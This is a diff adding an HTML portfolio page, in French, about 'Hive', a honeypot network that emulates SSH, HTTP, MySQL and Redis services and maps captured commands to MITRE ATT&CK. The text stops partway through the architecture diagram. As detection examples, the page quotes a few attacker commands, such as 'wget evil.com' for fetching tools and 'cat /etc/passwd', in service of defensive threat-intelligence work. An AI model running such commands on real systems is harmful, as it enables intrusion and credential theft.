@@ -1,0 +1,1321 @@
+<!DOCTYPE html>
+<html lang="fr">
+  <head>
+    <meta charset="utf-8" />
+    <meta content="width=device-width, initial-scale=1.0" name="viewport" />
+    <title>Hive – Advanced Honeypot Network | Jeanluck Cyber Insights</title>
+    <meta name="description" content="Hive est une plateforme de cyber-déception enterprise-grade, event-driven, construite en Go et React 19, permettant la collecte de renseignements sur les menaces en temps réel via l'émulation de protocoles SSH, HTTP, MySQL et Redis." />
+    <meta name="keywords" content="Honeypot, Cyber Deception, MITRE ATT&CK, STIX 2.1, Go, Golang, React 19, WebSocket, Threat Intelligence, SSH, iptables, Cybersecurity" />
+
+    <!-- Favicons -->
+    <link href="assets/img/favicon.png" rel="icon" />
+    <link href="assets/img/apple-touch-icon.png" rel="apple-touch-icon" />
+
+    <!-- Fonts -->
+    <link href="https://fonts.googleapis.com" rel="preconnect" />
+    <link href="https://fonts.gstatic.com" rel="preconnect" crossorigin />
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:ital,wght@0,100;0,300;0,400;0,500;0,700;0,900;1,100;1,300;1,400;1,500;1,700;1,900&family=Mukta:wght@200;300;400;500;600;700;800&family=Abel:wght@400&family=JetBrains+Mono:wght@400;600&display=swap" rel="stylesheet" />
+
+    <!-- Vendor CSS Files -->
+    <link href="assets/vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet" />
+    <link href="assets/vendor/bootstrap-icons/bootstrap-icons.css" rel="stylesheet" />
+    <link href="assets/vendor/aos/aos.css" rel="stylesheet" />
+    <link href="assets/vendor/swiper/swiper-bundle.min.css" rel="stylesheet" />
+    <link href="assets/vendor/glightbox/css/glightbox.min.css" rel="stylesheet" />
+
+    <!-- Main CSS File -->
+    <link href="assets/css/main.css" rel="stylesheet" />
+
+    <style>
+      /* ============================================================
+         HIVE PROJECT — CUSTOM STYLES
+         Palette: Amber #f59e0b | Dark Navy #0a0f1e | Teal #06b6d4
+      ============================================================ */
+      :root {
+        --hive-amber:   #f59e0b;
+        --hive-amber-d: #d97706;
+        --hive-teal:    #06b6d4;
+        --hive-green:   #10b981;
+        --hive-red:     #ef4444;
+        --hive-navy:    #0a0f1e;
+        --hive-navy-2:  #0d1525;
+        --hive-navy-3:  #111827;
+        --hive-border:  rgba(245, 158, 11, 0.25);
+        --hive-card-bg: rgba(13, 21, 37, 0.9);
+        --mono:         'JetBrains Mono', monospace;
+      }
+
+      /* ── Hero Banner ─────────────────────────────────────────── */
+      .hive-hero-banner {
+        position: relative;
+        min-height: 420px;
+        background: linear-gradient(135deg, var(--hive-navy) 0%, #0c1a3a 50%, #101218 100%);
+        overflow: hidden;
+        display: flex;
+        align-items: center;
+        border-bottom: 1px solid var(--hive-border);
+      }
+      .hive-hero-banner::before {
+        content: '';
+        position: absolute;
+        inset: 0;
+        background-image: url('assets/img/hive_hero.png');
+        background-size: cover;
+        background-position: center;
+        opacity: 0.18;
+      }
+      .hive-hero-banner .hex-grid {
+        position: absolute;
+        inset: 0;
+        background-image:
+          radial-gradient(circle at 20% 50%, rgba(245,158,11,0.07) 0%, transparent 60%),
+          radial-gradient(circle at 80% 30%, rgba(6,182,212,0.06) 0%, transparent 50%);
+      }
+      .hive-hero-content {
+        position: relative;
+        z-index: 2;
+        padding: 60px 0 50px;
+      }
+      .hive-featured-badge {
+        display: inline-flex;
+        align-items: center;
+        gap: 8px;
+        background: rgba(245,158,11,0.15);
+        border: 1px solid rgba(245,158,11,0.4);
+        border-radius: 50px;
+        padding: 6px 18px;
+        font-family: var(--mono);
+        font-size: 0.72rem;
+        letter-spacing: 0.12em;
+        color: var(--hive-amber);
+        text-transform: uppercase;
+        margin-bottom: 20px;
+      }
+      .hive-featured-badge .dot {
+        width: 8px; height: 8px;
+        border-radius: 50%;
+        background: var(--hive-amber);
+        animation: pulse-dot 1.5s ease-in-out infinite;
+      }
+      @keyframes pulse-dot {
+        0%,100% { box-shadow: 0 0 0 0 rgba(245,158,11,0.6); }
+        50%       { box-shadow: 0 0 0 6px rgba(245,158,11,0); }
+      }
+      .hive-hero-title {
+        font-size: clamp(2rem, 4vw, 3.2rem);
+        font-weight: 800;
+        color: #fff;
+        line-height: 1.15;
+        margin-bottom: 14px;
+      }
+      .hive-hero-title .accent { color: var(--hive-amber); }
+      .hive-hero-subtitle {
+        font-size: 1.05rem;
+        color: rgba(255,255,255,0.7);
+        max-width: 680px;
+        line-height: 1.7;
+        margin-bottom: 28px;
+      }
+      .hive-tags-row {
+        display: flex;
+        flex-wrap: wrap;
+        gap: 10px;
+        margin-bottom: 30px;
+      }
+      .hive-tag {
+        padding: 5px 14px;
+        border-radius: 50px;
+        font-size: 0.8rem;
+        font-family: var(--mono);
+        font-weight: 600;
+        letter-spacing: 0.04em;
+      }
+      .tag-go    { background: rgba(0,173,216,0.15); border: 1px solid rgba(0,173,216,0.4); color: #00aed8; }
+      .tag-react { background: rgba(97,218,251,0.1);  border: 1px solid rgba(97,218,251,0.35); color: #61dafb; }
+      .tag-mitre { background: rgba(239,68,68,0.1);   border: 1px solid rgba(239,68,68,0.35); color: #f87171; }
+      .tag-stix  { background: rgba(16,185,129,0.1);  border: 1px solid rgba(16,185,129,0.35); color: #34d399; }
+      .tag-ws    { background: rgba(168,85,247,0.1);  border: 1px solid rgba(168,85,247,0.35); color: #c084fc; }
+      .tag-ssh   { background: rgba(245,158,11,0.1);  border: 1px solid rgba(245,158,11,0.35); color: var(--hive-amber); }
+      .tag-cyber { background: rgba(6,182,212,0.1);   border: 1px solid rgba(6,182,212,0.35); color: var(--hive-teal); }
+
+      .hive-meta-row {
+        display: flex;
+        flex-wrap: wrap;
+        gap: 20px;
+        align-items: center;
+        font-size: 0.88rem;
+        color: rgba(255,255,255,0.55);
+      }
+      .hive-meta-row i { color: var(--hive-amber); margin-right: 6px; }
+
+      /* ── Metrics Cards ──────────────────────────────────────── */
+      .hive-metrics {
+        background: var(--hive-navy-2);
+        border-top: 1px solid var(--hive-border);
+        border-bottom: 1px solid var(--hive-border);
+        padding: 48px 0;
+      }
+      .metric-card {
+        background: var(--hive-card-bg);
+        border: 1px solid var(--hive-border);
+        border-radius: 16px;
+        padding: 28px 24px;
+        height: 100%;
+        position: relative;
+        overflow: hidden;
+        transition: transform 0.3s ease, box-shadow 0.3s ease;
+      }
+      .metric-card:hover {
+        transform: translateY(-5px);
+        box-shadow: 0 12px 40px rgba(245,158,11,0.12);
+      }
+      .metric-card::before {
+        content: '';
+        position: absolute;
+        top: 0; left: 0; right: 0;
+        height: 3px;
+        border-radius: 3px 3px 0 0;
+      }
+      .metric-card.amber::before { background: linear-gradient(90deg, var(--hive-amber), var(--hive-amber-d)); }
+      .metric-card.teal::before  { background: linear-gradient(90deg, var(--hive-teal), #0284c7); }
+      .metric-card.green::before { background: linear-gradient(90deg, var(--hive-green), #059669); }
+      .metric-card.red::before   { background: linear-gradient(90deg, var(--hive-red), #b91c1c); }
+      .metric-icon {
+        font-size: 2.2rem;
+        margin-bottom: 14px;
+      }
+      .metric-card.amber .metric-icon { color: var(--hive-amber); }
+      .metric-card.teal  .metric-icon { color: var(--hive-teal);  }
+      .metric-card.green .metric-icon { color: var(--hive-green); }
+      .metric-card.red   .metric-icon { color: var(--hive-red);   }
+      .metric-value {
+        font-size: 1.6rem;
+        font-weight: 800;
+        color: #fff;
+        line-height: 1;
+        margin-bottom: 8px;
+        font-family: var(--mono);
+      }
+      .metric-label {
+        font-size: 0.82rem;
+        font-weight: 700;
+        text-transform: uppercase;
+        letter-spacing: 0.08em;
+        margin-bottom: 8px;
+      }
+      .metric-card.amber .metric-label { color: var(--hive-amber); }
+      .metric-card.teal  .metric-label { color: var(--hive-teal);  }
+      .metric-card.green .metric-label { color: var(--hive-green); }
+      .metric-card.red   .metric-label { color: var(--hive-red);   }
+      .metric-desc {
+        font-size: 0.82rem;
+        color: rgba(255,255,255,0.5);
+        line-height: 1.5;
+      }
+
+      /* ── Section common ──────────────────────────────────────── */
+      .hive-section {
+        padding: 72px 0;
+      }
+      .hive-section-dark { background: var(--hive-navy); }
+      .hive-section-mid  { background: var(--hive-navy-2); }
+      .hive-section-alt  { background: var(--hive-navy-3); }
+
+      .hive-section-title {
+        font-size: 0.75rem;
+        text-transform: uppercase;
+        letter-spacing: 0.18em;
+        color: var(--hive-amber);
+        font-family: var(--mono);
+        font-weight: 600;
+        margin-bottom: 10px;
+      }
+      .hive-section-heading {
+        font-size: clamp(1.5rem, 3vw, 2.2rem);
+        font-weight: 800;
+        color: #fff;
+        margin-bottom: 16px;
+      }
+      .hive-section-heading .accent { color: var(--hive-amber); }
+      .hive-section-lead {
+        color: rgba(255,255,255,0.6);
+        font-size: 1rem;
+        line-height: 1.8;
+        max-width: 700px;
+      }
+
+      /* ── Deep Dive Cards ────────────────────────────────────── */
+      .deepdive-card {
+        background: var(--hive-card-bg);
+        border: 1px solid rgba(255,255,255,0.07);
+        border-radius: 16px;
+        padding: 30px;
+        height: 100%;
+        transition: border-color 0.3s ease, box-shadow 0.3s ease;
+      }
+      .deepdive-card:hover {
+        border-color: rgba(245,158,11,0.3);
+        box-shadow: 0 8px 30px rgba(245,158,11,0.08);
+      }
+      .deepdive-card .card-icon-wrap {
+        width: 52px; height: 52px;
+        border-radius: 12px;
+        display: flex; align-items: center; justify-content: center;
+        font-size: 1.5rem;
+        margin-bottom: 18px;
+      }
+      .icon-amber { background: rgba(245,158,11,0.12); color: var(--hive-amber); }
+      .icon-teal  { background: rgba(6,182,212,0.12);  color: var(--hive-teal);  }
+      .icon-green { background: rgba(16,185,129,0.12); color: var(--hive-green); }
+      .icon-red   { background: rgba(239,68,68,0.12);  color: var(--hive-red);   }
+      .icon-purple{ background: rgba(168,85,247,0.12); color: #c084fc; }
+
+      .deepdive-card h4 {
+        font-size: 1.1rem;
+        font-weight: 700;
+        color: #fff;
+        margin-bottom: 12px;
+      }
+      .deepdive-card p, .deepdive-card li {
+        font-size: 0.9rem;
+        color: rgba(255,255,255,0.6);
+        line-height: 1.75;
+      }
+      .deepdive-card ul {
+        padding-left: 18px;
+        margin: 0;
+      }
+      .deepdive-card ul li { margin-bottom: 6px; }
+      .deepdive-card ul li strong { color: rgba(255,255,255,0.85); }
+
+      /* ── Architecture Diagram ───────────────────────────────── */
+      .arch-diagram {
+        background: var(--hive-navy);
+        border: 1px solid var(--hive-border);
+        border-radius: 20px;
+        padding: 40px;
+        position: relative;
+        overflow: hidden;
+      }
+      .arch-diagram::before {
+        content: '';
+        position: absolute;
+        inset: 0;
+        background: radial-gradient(ellipse at 50% 0%, rgba(245,158,11,0.06) 0%, transparent 65%);
+      }
+      .arch-flow {
+        display: flex;
+        flex-direction: column;
+        gap: 0;
+        position: relative;
+        z-index: 1;
+      }
+      .arch-row {
+        display: flex;
+        align-items: stretch;
+        gap: 0;
+      }
+      .arch-node {
+        flex: 1;
+        border-radius: 12px;
+        padding: 16px 20px;
+        text-align: center;
+        position: relative;
+      }
+      .arch-node .node-label {
+        font-size: 0.78rem;
+        font-weight: 700;
+        font-family: var(--mono);
+        text-transform: uppercase;
+        letter-spacing: 0.06em;
+        margin-bottom: 6px;
+      }
+      .arch-node .node-desc {
+        font-size: 0.72rem;
+        opacity: 0.7;
+        line-height: 1.4;
+      }
+      .node-attackers { background: rgba(239,68,68,0.15); border: 1px solid rgba(239,68,68,0.35); color: #fca5a5; }
+      .node-go        { background: rgba(0,173,216,0.12); border: 1px solid rgba(0,173,216,0.35); color: #67e8f9; }
+      .node-eventbus  { background: rgba(245,158,11,0.12);border: 1px solid rgba(245,158,11,0.35); color: var(--hive-amber); }
+      .node-mitre     { background: rgba(239,68,68,0.12); border: 1px solid rgba(239,68,68,0.35); color: #f87171; }
+      .node-api       { background: rgba(168,85,247,0.12);border: 1px solid rgba(168,85,247,0.35); color: #c084fc; }
+      .node-react     { background: rgba(97,218,251,0.1); border: 1px solid rgba(97,218,251,0.35); color: #61dafb; }
+
+      .arch-arrow {
+        display: flex;
+        justify-content: center;
+        padding: 8px 0;
+        color: rgba(245,158,11,0.5);
+        font-size: 1.2rem;
+      }
+
+      .arch-row-multi {
+        display: grid;
+        grid-template-columns: repeat(4, 1fr);
+        gap: 12px;
+        margin-bottom: 0;
+      }
+
+      /* ── Terminal Walkthrough ───────────────────────────────── */
+      .terminal-window {
+        background: #0d1117;
+        border: 1px solid rgba(255,255,255,0.1);
+        border-radius: 12px;
+        overflow: hidden;
+        font-family: var(--mono);
+      }
+      .terminal-header {
+        background: #161b22;
+        padding: 12px 18px;
+        display: flex;
+        align-items: center;
+        gap: 8px;
+        border-bottom: 1px solid rgba(255,255,255,0.07);
+      }
+      .terminal-dot {
+        width: 12px; height: 12px;
+        border-radius: 50%;
+      }
+      .dot-red    { background: #ff5f57; }
+      .dot-yellow { background: #ffbd2e; }
+      .dot-green  { background: #28c840; }
+      .terminal-title {
+        margin-left: 8px;
+        font-size: 0.78rem;
+        color: rgba(255,255,255,0.4);
+      }
+      .terminal-body {
+        padding: 20px 24px;
+        font-size: 0.82rem;
+        line-height: 1.9;
+      }
+      .t-prompt { color: #58d68d; }
+      .t-cmd    { color: #fff; }
+      .t-output { color: rgba(255,255,255,0.55); }
+      .t-warn   { color: #f59e0b; }
+      .t-alert  { color: #ef4444; }
+      .t-info   { color: #06b6d4; }
+      .t-success{ color: #10b981; }
+      .t-comment{ color: rgba(255,255,255,0.28); }
+
+      /* ── Walkthrough Steps ──────────────────────────────────── */
+      .walkthrough-step {
+        position: relative;
+        padding-left: 56px;
+        margin-bottom: 40px;
+      }
+      .walkthrough-step:last-child { margin-bottom: 0; }
+      .step-number {
+        position: absolute;
+        left: 0; top: 0;
+        width: 40px; height: 40px;
+        border-radius: 50%;
+        background: rgba(245,158,11,0.12);
+        border: 2px solid rgba(245,158,11,0.5);
+        display: flex; align-items: center; justify-content: center;
+        font-size: 0.9rem;
+        font-weight: 800;
+        color: var(--hive-amber);
+        font-family: var(--mono);
+        flex-shrink: 0;
+      }
+      .walkthrough-step::after {
+        content: '';
+        position: absolute;
+        left: 19px; top: 42px;
+        width: 2px;
+        bottom: -40px;
+        background: linear-gradient(180deg, rgba(245,158,11,0.3), transparent);
+      }
+      .walkthrough-step:last-child::after { display: none; }
+      .step-label {
+        font-size: 0.72rem;
+        font-family: var(--mono);
+        text-transform: uppercase;
+        letter-spacing: 0.1em;
+        color: var(--hive-amber);
+        margin-bottom: 4px;
+      }
+      .step-title {
+        font-size: 1.05rem;
+        font-weight: 700;
+        color: #fff;
+        margin-bottom: 8px;
+      }
+      .step-desc {
+        font-size: 0.88rem;
+        color: rgba(255,255,255,0.55);
+        line-height: 1.7;
+        margin-bottom: 14px;
+      }
+
+      /* ── File Tree ──────────────────────────────────────────── */
+      .file-tree {
+        background: #0d1117;
+        border: 1px solid rgba(255,255,255,0.08);
+        border-radius: 12px;
+        padding: 24px;
+        font-family: var(--mono);
+        font-size: 0.82rem;
+        line-height: 2;
+      }
+      .ft-root    { color: var(--hive-amber); font-weight: 700; }
+      .ft-dir     { color: #61dafb; }
+      .ft-file    { color: rgba(255,255,255,0.6); }
+      .ft-comment { color: rgba(255,255,255,0.28); font-style: italic; }
+      .ft-indent1 { padding-left: 20px; }
+      .ft-indent2 { padding-left: 40px; }
+
+      /* ── Ethics Disclaimer ──────────────────────────────────── */
+      .ethics-card {
+        background: rgba(239,68,68,0.07);
+        border: 1px solid rgba(239,68,68,0.3);
+        border-radius: 16px;
+        padding: 32px;
+      }
+      .ethics-card h4 { color: #f87171; font-size: 1.1rem; font-weight: 700; margin-bottom: 12px; }
+      .ethics-card p, .ethics-card li {
+        color: rgba(255,255,255,0.6);
+        font-size: 0.9rem;
+        line-height: 1.8;
+      }
+      .ethics-card ul { padding-left: 20px; }
+
+      /* ── Navigation ─────────────────────────────────────────── */
+      .hive-nav {
+        background: var(--hive-navy);
+        border-top: 1px solid var(--hive-border);
+        padding: 32px 0;
+      }
+      .hive-nav-inner {
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+        flex-wrap: wrap;
+        gap: 16px;
+      }
+      .nav-btn {
+        display: inline-flex;
+        align-items: center;
+        gap: 10px;
+        padding: 12px 24px;
+        border-radius: 10px;
+        font-size: 0.88rem;
+        font-weight: 600;
+        text-decoration: none;
+        transition: all 0.3s ease;
+      }
+      .nav-btn-outline {
+        border: 1px solid var(--hive-border);
+        color: rgba(255,255,255,0.7);
+      }
+      .nav-btn-outline:hover {
+        border-color: var(--hive-amber);
+        color: var(--hive-amber);
+        background: rgba(245,158,11,0.08);
+      }
+      .nav-btn-primary {
+        background: linear-gradient(135deg, var(--hive-amber), var(--hive-amber-d));
+        color: #000;
+      }
+      .nav-btn-primary:hover {
+        transform: translateY(-2px);
+        box-shadow: 0 8px 24px rgba(245,158,11,0.3);
+        color: #000;
+      }
+
+      /* ── STIX / CTI Badge ───────────────────────────────────── */
+      .cti-pipeline {
+        display: flex;
+        flex-wrap: wrap;
+        align-items: center;
+        gap: 12px;
+        padding: 20px;
+        background: rgba(16,185,129,0.06);
+        border: 1px solid rgba(16,185,129,0.2);
+        border-radius: 12px;
+        margin-top: 20px;
+      }
+      .cti-step {
+        display: flex;
+        align-items: center;
+        gap: 8px;
+        font-size: 0.8rem;
+        font-family: var(--mono);
+        color: rgba(255,255,255,0.7);
+      }
+      .cti-step .badge-pill {
+        background: rgba(16,185,129,0.15);
+        border: 1px solid rgba(16,185,129,0.35);
+        color: #34d399;
+        padding: 3px 10px;
+        border-radius: 50px;
+        font-size: 0.75rem;
+        font-weight: 600;
+      }
+      .cti-arrow { color: rgba(255,255,255,0.25); font-size: 1rem; }
+
+      /* ── Responsive adjustments ─────────────────────────────── */
+      @media (max-width: 768px) {
+        .arch-row-multi { grid-template-columns: 1fr 1fr; }
+        .hive-hero-title { font-size: 1.8rem; }
+        .arch-diagram { padding: 24px 16px; }
+      }
+      @media (max-width: 480px) {
+        .arch-row-multi { grid-template-columns: 1fr; }
+      }
+    </style>
+  </head>
+
+  <body class="portfolio-details-page" style="background: #0a0f1e; color: #fff;">
+
+    <!-- ═══════════════ HEADER ═══════════════ -->
+    <header id="header" class="header d-flex align-items-center position-relative">
+      <div class="container-fluid position-relative d-flex align-items-center justify-content-between">
+        <a href="index.html" class="logo d-flex align-items-center">
+          <h1 class="sitename">Jeanluck Cyber Insights</h1>
+        </a>
+        <nav id="navmenu" class="navmenu">
+          <ul>
+            <li><a href="index.html#hero" class="active">Accueil</a></li>
+            <li><a href="index.html#Apropos">À Propos</a></li>
+            <li><a href="index.html#portfolio">Projets &amp; Études de Cas</a></li>
+            <li><a href="index.html#contact">Contact</a></li>
+          </ul>
+          <i class="mobile-nav-toggle d-xl-none bi bi-list"></i>
+        </nav>
+      </div>
+    </header>
+
+    <main class="main">
+
+      <!-- ═══════════════ HERO BANNER ═══════════════ -->
+      <section class="hive-hero-banner">
+        <div class="hex-grid"></div>
+        <div class="container">
+          <div class="hive-hero-content" data-aos="fade-up">
+
+            <!-- Breadcrumb -->
+            <div class="hive-meta-row mb-3" style="font-size:0.8rem;">
+              <a href="index.html" style="color: var(--hive-amber); text-decoration:none;">
+                <i class="bi bi-house-fill"></i> Accueil
+              </a>
+              <span style="color:rgba(255,255,255,0.3);">/</span>
+              <span style="color:rgba(255,255,255,0.5);">Projets</span>
+              <span style="color:rgba(255,255,255,0.3);">/</span>
+              <span>Hive</span>
+            </div>
+
+            <div class="hive-featured-badge">
+              <span class="dot"></span>
+              ⭐ Featured Project — Cyber Deception Platform
+            </div>
+
+            <h1 class="hive-hero-title">
+              🐝 Hive — <span class="accent">Advanced</span><br>Honeypot Network
+            </h1>
+
+            <p class="hive-hero-subtitle">
+              <em>Enterprise-grade, event-driven cyber deception platform built for real-time threat intelligence gathering.</em><br>
+              Observer les TTPs des attaquants en temps réel via 4 pièges de protocoles — sans jamais exposer votre production.
+            </p>
+
+            <div class="hive-tags-row">
+              <span class="hive-tag tag-go">Go (Golang)</span>
+              <span class="hive-tag tag-react">React 19</span>
+              <span class="hive-tag tag-ws">WebSockets</span>
+              <span class="hive-tag tag-mitre">MITRE ATT&amp;CK</span>
+              <span class="hive-tag tag-stix">STIX 2.1</span>
+              <span class="hive-tag tag-ssh">SSH PTY</span>
+              <span class="hive-tag tag-cyber">Cyber Deception</span>
+              <span class="hive-tag tag-stix">Threat Intel</span>
+            </div>
+
+            <div class="hive-meta-row">
+              <span><i class="bi bi-calendar3"></i> 2025–2026</span>
+              <span><i class="bi bi-building"></i> Projet de Recherche Indépendant</span>
+              <span><i class="bi bi-github"></i>
+                <a href="https://github.com/jeanlucndato" target="_blank" rel="noopener" style="color:rgba(255,255,255,0.55); text-decoration:none;">
+                  github.com/jeanlucndato
+                </a>
+              </span>
+              <span><i class="bi bi-tag-fill"></i> v1.0 — Lock-Free Architecture</span>
+            </div>
+
+          </div>
+        </div>
+      </section>
+
+      <!-- ═══════════════ KEY METRICS ═══════════════ -->
+      <section class="hive-metrics">
+        <div class="container">
+          <div class="text-center mb-4" data-aos="fade-up">
+            <p class="hive-section-title">Performance &amp; Architecture Highlights</p>
+            <h2 class="hive-section-heading">4 Indicateurs Clés de Hive</h2>
+          </div>
+          <div class="row g-4" data-aos="fade-up" data-aos-delay="100">
+            <!-- Card 1 -->
+            <div class="col-lg-3 col-md-6">
+              <div class="metric-card amber h-100">
+                <div class="metric-icon"><i class="bi bi-cpu"></i></div>
+                <div class="metric-value">100%</div>
+                <div class="metric-label">Lock-Free Event Architecture</div>
+                <div class="metric-desc">Zero CPU blocking sur les listeners réseau. Go channels &amp; goroutines garantissent un débit maximal même sous attaque brute-force.</div>
+              </div>
+            </div>
+            <!-- Card 2 -->
+            <div class="col-lg-3 col-md-6">
+              <div class="metric-card teal h-100">
+                <div class="metric-icon"><i class="bi bi-hdd-network"></i></div>
+                <div class="metric-value">4</div>
+                <div class="metric-label">Protocol Honeypots Built-in</div>
+                <div class="metric-desc">SSH (PTY interactif), HTTP (WordPress &amp; phpMyAdmin), MySQL (auth capture), Redis (parser RESP complet).</div>
+              </div>
+            </div>
+            <!-- Card 3 -->
+            <div class="col-lg-3 col-md-6">
+              <div class="metric-card green h-100">
+                <div class="metric-icon"><i class="bi bi-broadcast"></i></div>
+                <div class="metric-value">&lt;10ms</div>
+                <div class="metric-label">Real-time WebSocket Latency</div>
+                <div class="metric-desc">Pipeline WebSocket streaming vers le dashboard React 19. Chaque attaque est visible instantanément dans le SOC Dashboard.</div>
+              </div>
+            </div>
+            <!-- Card 4 -->
+            <div class="col-lg-3 col-md-6">
+              <div class="metric-card red h-100">
+                <div class="metric-icon"><i class="bi bi-shield-exclamation"></i></div>
+                <div class="metric-value">Auto</div>
+                <div class="metric-label">Threat Intel Output</div>
+                <div class="metric-desc">Génération automatique de STIX 2.1 + règles iptables dynamiques à chaque événement malveillant détecté.</div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </section>
+
+      <!-- ═══════════════ TECHNICAL DEEP-DIVE ═══════════════ -->
+      <section class="hive-section hive-section-dark">
+        <div class="container">
+          <div class="row mb-5" data-aos="fade-up">
+            <div class="col-lg-8">
+              <p class="hive-section-title">Analyse Technique Approfondie</p>
+              <h2 class="hive-section-heading">Architecture &amp; <span class="accent">Technical Deep-Dive</span></h2>
+              <p class="hive-section-lead">
+                Hive repose sur trois piliers techniques distincts : un backend Go hautes performances, une couche d'émulation bas-niveau des protocoles réseau, et un pipeline automatisé de Cyber Threat Intelligence.
+              </p>
+            </div>
+          </div>
+
+          <div class="row g-4">
+            <!-- Go Backend -->
+            <div class="col-lg-4" data-aos="fade-up" data-aos-delay="50">
+              <div class="deepdive-card h-100">
+                <div class="card-icon-wrap icon-amber"><i class="bi bi-cpu-fill"></i></div>
+                <h4>⚙️ Go Backend — Event Bus Lock-Free</h4>
+                <p>Le cœur de Hive est un <strong>bus d'événements 100% asynchrone</strong> basé sur des goroutines et des channels Go natifs :</p>
+                <ul>
+                  <li><strong>Goroutines légères :</strong> chaque connexion attaquant est traitée dans une goroutine isolée (~2KB RAM), permettant de gérer des milliers de connexions simultanées sans dégradation.</li>
+                  <li><strong>Lock-Free Channels :</strong> les événements réseau sont poussés dans des channels non-bloquants. Aucun mutex, aucun deadlock possible, même sous DoS ou brute-force intensif.</li>
+                  <li><strong>Orchestrateur principal :</strong> <code>cmd/hive/</code> démarre tous les listeners en parallèle et supervise le bus d'événements central.</li>
+                </ul>
+                <div class="mt-3 p-2 rounded" style="background: rgba(245,158,11,0.07); border-left: 3px solid var(--hive-amber);">
+                  <span style="font-size:0.8rem; color:rgba(255,255,255,0.5);">Performance garantie :</span><br>
+                  <span style="font-size:0.85rem; color:var(--hive-amber); font-family:var(--mono);">~0% CPU overhead sur idle listeners</span>
+                </div>
+              </div>
+            </div>
+
+            <!-- Protocol Emulation -->
+            <div class="col-lg-4" data-aos="fade-up" data-aos-delay="150">
+              <div class="deepdive-card h-100">
+                <div class="card-icon-wrap icon-teal"><i class="bi bi-diagram-3-fill"></i></div>
+                <h4>🔌 Émulation Bas-Niveau des Protocoles</h4>
+                <p>Chaque honeypot émule le protocole cible avec une fidélité suffisante pour tromper les scanners automatisés et les attaquants humains :</p>
+                <ul>
+                  <li><strong>SSH PTY (<code>internal/sshd/</code>) :</strong> Pseudo-Terminal interactif complet. L'attaquant croit opérer sur un vrai shell Linux. Chaque commande (<code>wget</code>, <code>curl</code>, <code>cat /etc/passwd</code>) est capturée.</li>
+                  <li><strong>HTTP (<code>internal/httpd/</code>) :</strong> Simule WordPress (<code>/wp-login.php</code>, <code>/wp-admin</code>) et phpMyAdmin. Piège les scanners WPScan &amp; Nikto.</li>
+                  <li><strong>MySQL (<code>internal/mysqld/</code>) :</strong> Capture le handshake d'authentification — credentials inclus — sans jamais exposer de vraies données.</li>
+                  <li><strong>Redis RESP (<code>internal/redisd/</code>) :</strong> Parser du protocole RESP complet pour détecter les tentatives <code>CONFIG SET</code> et exfiltrations.</li>
+                </ul>
+              </div>
+            </div>
+
+            <!-- CTI Pipeline -->
+            <div class="col-lg-4" data-aos="fade-up" data-aos-delay="250">
+              <div class="deepdive-card h-100">
+                <div class="card-icon-wrap icon-green"><i class="bi bi-shield-shaded"></i></div>
+                <h4>🧠 Pipeline CTI — MITRE ATT&amp;CK → STIX 2.1</h4>
+                <p>Le pipeline de Cyber Threat Intelligence transforme chaque interaction brute en renseignement structuré exploitable :</p>
+                <ul>
+                  <li><strong>Moteur MITRE (<code>internal/mitre/</code>) :</strong> Corrèle les commandes capturées aux identifiants ATT&amp;CK. Ex: <code>wget evil.com</code> → <strong>T1105 – Ingress Tool Transfer</strong>.</li>
+                  <li><strong>Processeur IOC (<code>internal/store/</code>) :</strong>
+                    <ul>
+                      <li>Génère <code>threat-intel.stix.json</code> (STIX 2.1) avec les <em>Indicators of Compromise</em>, les TTPs et les relations.</li>
+                      <li>Écrit <code>iptables-blocklist.txt</code> pour un blocage réseau immédiat.</li>
+                    </ul>
+                  </li>
+                  <li><strong>API &amp; WebSocket (<code>internal/api/</code>) :</strong> Diffuse les événements en streaming vers le dashboard React 19 en moins de 10ms.</li>
+                </ul>
+                <div class="cti-pipeline">
+                  <span class="cti-step"><span class="badge-pill">Raw Command</span></span>
+                  <span class="cti-arrow">→</span>
+                  <span class="cti-step"><span class="badge-pill">MITRE TTP</span></span>
+                  <span class="cti-arrow">→</span>
+                  <span class="cti-step"><span class="badge-pill">STIX 2.1</span></span>
+                  <span class="cti-arrow">→</span>
+                  <span class="cti-step"><span class="badge-pill">iptables</span></span>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </section>
+
+      <!-- ═══════════════ ARCHITECTURE DIAGRAM ═══════════════ -->
+      <section class="hive-section hive-section-mid">
+        <div class="container">
+          <div class="text-center mb-5" data-aos="fade-up">
+            <p class="hive-section-title">Schéma Interactif</p>
+            <h2 class="hive-section-heading">Architecture &amp; <span class="accent">Data Flow</span></h2>
+            <p class="hive-section-lead mx-auto">
+              De l'attaquant au dashboard SOC — chaque octet est capturé, analysé et transformé en intelligence opérationnelle.
+            </p>
+          </div>
+
+          <div class="arch-diagram" data-aos="zoom-in" data-aos-delay="100">
+            <div class="arch-flow">
+
+              <!-- Attackers -->
+              <div class="arch-row">
+                <div class="arch-node node-attackers">
+                  <div class="node-label">🔴 Attackers</div>
+                  <div class="node-desc">SSH :2222 &nbsp;|&nbsp; HTTP :8080 &nbsp;|&nbsp; MySQL :3306 &nbsp;|&nbsp; Redis :6379</div>
+                </div>
+              </div>
+
+              <div class="arch-arrow"><i class="bi bi-arrow-down"></i></div>
+
+              <!-- Go Listeners -->
+              <div class="arch-row-multi">
+                <div class="arch-node node-go">
+                  <div class="node-label">🐚 SSH Trap</div>
+                  <div class="node-desc">internal/sshd/<br>PTY interactif</div>
+                </div>
+                <div class="arch-node node-go">
+                  <div class="node-label">🌐 HTTP Trap</div>
+                  <div class="node-desc">internal/httpd/<br>WP &amp; phpMyAdmin</div>
+                </div>
+                <div class="arch-node node-go">
+                  <div class="node-label">🗄️ MySQL Trap</div>
+                  <div class="node-desc">internal/mysqld/<br>Auth Capture</div>
+                </div>
+                <div class="arch-node node-go">
+                  <div class="node-label">⚡ Redis Trap</div>
+                  <div class="node-desc">internal/redisd/<br>RESP Parser</div>
+                </div>
+              </div>
+
+              <div class="arch-arrow"><i class="bi bi-arrow-down"></i></div>
+
+              <!-- Event Bus -->
+              <div class="arch-row">
+                <div class="arch-node node-eventbus">
+                  <div class="node-label">⚡ Event Bus — 100% Lock-Free</div>
+                  <div class="node-desc">internal/event/ — Go Channels &amp; Goroutines — Asynchronous Non-Blocking Pipeline</div>
+                </div>
+              </div>
+
+              <div class="arch-arrow"><i class="bi bi-arrow-down"></i></div>
+
